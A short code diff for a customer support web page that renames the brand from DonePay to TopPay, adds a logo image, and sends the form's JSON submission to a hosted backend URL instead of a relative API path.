@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DonePay Customer Support</title>
+    <title>TopPay Customer Support</title>
     <!-- Font Awesome for Success Icon -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -77,8 +77,8 @@
            Since 'public' is the root folder for the server, 
            'public/logo.png' is accessed simply as 'logo.png' 
         -->
-        
-        <h1 class="brand-title">DonePay Customer Support</h1>
+        <img src="logo.png" alt="Logo" class="logo-img">
+        <h1 class="brand-title">TopPay Customer Support</h1>
     </div>
 
     <!-- VIEW 1: LOGIN -->
@@ -230,7 +230,8 @@
         };
 
         try {
-            const res = await fetch('/api/submit', {
+            const BACKEND_URL = 'https://donepay-app.onrender.com'; 
+            const res = await fetch(`${BACKEND_URL}/api/submit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
